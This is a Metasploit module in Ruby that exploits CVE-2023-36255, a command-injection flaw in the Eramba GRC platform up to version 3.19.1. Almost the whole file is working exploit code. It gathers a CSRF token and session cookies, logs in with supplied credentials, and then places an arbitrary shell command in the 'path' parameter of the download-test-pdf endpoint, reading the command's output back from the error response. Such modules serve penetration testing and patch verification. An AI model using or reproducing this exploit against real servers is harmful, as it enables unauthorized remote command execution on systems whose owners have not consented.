##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Eramba (up to 3.19.1) Remote Code Execution Exploit',
        'Description' => %q{
          This module exploits a remote code execution vulnerability in Eramba.
          An authenticated user can execute arbitrary commands on the server by
          exploiting the path parameter in the download-test-pdf endpoint.
          Eramba debug mode has to be enabled.
        },
        'Author' => [
          'Trovent Security GmbH',
          'Sergey Makarov',        # vulnerability discovery and exploit
          'Stefan Pietsch',        # CVE and Advisory
          'Niklas Rubel'           # MSF module
        ],
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        },
        'References' => [
          ['CVE', '2023-36255'],
          ['URL', 'https://trovent.github.io/security-advisories/TRSA-2303-01/TRSA-2303-01.txt']
        ],
        'DisclosureDate' => '2023-08-01',
        'DefaultOptions' => {
          'RPORT' => 443,
          'SSL' => true
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [ true, 'The base path to Eramba', '/']),
        OptString.new('USERNAME', [ true, 'The username to authenticate with']),
        OptString.new('PASSWORD', [ true, 'The password to authenticate with']),
        OptString.new('COMMAND', [ true, 'The command to execute', 'whoami']),
      ]
    )
  end

  def get_csrf_token_and_cookies
    print_status('Retrieving CSRF token and session cookies...')
    redirect_path = "/settings/download-test-pdf?path=#{datastore['COMMAND']};"
    login_url = normalize_uri(target_uri.path, "login?redirect=#{URI.encode_www_form_component(redirect_path)}")
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => login_url
    })

    unless res && res.code == 200
      fail_with(Failure::UnexpectedReply, 'Failed to retrieve the login page')
    end

    doc = Nokogiri::HTML(res.body)
    csrf_token = doc.at("input[name='_csrfToken']")['value']
    token_fields = doc.at("input[name='_Token[fields]']")['value']
    token_unlocked = doc.at("input[name='_Token[unlocked]']")['value']
    cookies = res.get_cookies

    print_status("CSRF Token: #{csrf_token}")
    print_status("Token Fields: #{token_fields}")
    print_status("Token Unlocked: #{token_unlocked}")

    return csrf_token, token_fields, token_unlocked, cookies
  end

  def clean_cookies(cookies)
    cleaned_cookies = cookies.split('; ').reject { |cookie| cookie.include?('PHPSESSID=deleted') }
    cleaned_cookies.join('; ')
  end

  def login_and_redirect(csrf_token, token_fields, token_unlocked, cookies)
    redirect_path = "/settings/download-test-pdf?path=#{datastore['COMMAND']};"
    login_url = normalize_uri(target_uri.path, "login?redirect=#{URI.encode_www_form_component(redirect_path)}")

    print_status('Attempting to log in and redirect to command execution page...')
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => login_url,
      'cookie' => cookies,
      'vars_post' => {
        '_csrfToken' => csrf_token,
        'login' => datastore['USERNAME'],
        'password' => datastore['PASSWORD'],
        '_Token[fields]' => token_fields,
        '_Token[unlocked]' => token_unlocked,
        '_Token[debug]' => '["/login",["login","password"],["modalId","","modalBreadcrumbs"]]'
      }
    })

    if res && res.code == 302
      print_good('Login successful, redirected to command execution page.')

      new_cookies = clean_cookies(res.get_cookies)
      print_status("Session Cookies after cleaning: #{new_cookies}")

      command_encoded = URI.encode_www_form_component(datastore['COMMAND'].to_s)
      redirect_path = "/settings/download-test-pdf?path=#{command_encoded};"
      redirect_url = normalize_uri(target_uri.path, redirect_path.to_s)

      res = send_request_cgi({
        'method' => 'GET',
        'uri' => redirect_url,
        'cookie' => new_cookies
      })

      print_good(redirect_url)
      if res && res.code == 500
        print_good('Command executed successfully. Response content:')
        extract_stdout(res.body)
      else
        fail_with(Failure::UnexpectedReply, 'Failed to execute command after redirect')
      end
    else
      fail_with(Failure::UnexpectedReply, 'Login failed or redirect not received')
    end
  end

  def extract_stdout(response_body)
    if response_body.include?('stdout:')
      stdout_start = response_body.index('stdout: &quot;') + 14
      stdout_end = response_body.index("&quot;\ncommand:") || response_body.length
      stdout_output = response_body[stdout_start...stdout_end].strip
      print_line(stdout_output.to_s)
    else
      print_error('No stdout found in the response')
    end
  end

  def run
    csrf_token, token_fields, token_unlocked, initial_cookies = get_csrf_token_and_cookies
    login_and_redirect(csrf_token, token_fields, token_unlocked, initial_cookies)
  end
end
